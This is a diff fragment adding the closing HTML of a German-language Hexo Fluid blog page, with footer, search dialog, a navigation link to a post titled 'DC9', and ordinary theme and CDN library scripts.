+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/24/vulnhub%E2%80%94DC9/" title="DC9">
+                        <span class="hidden-mobile">DC9</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Inhaltsverzeichnis</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
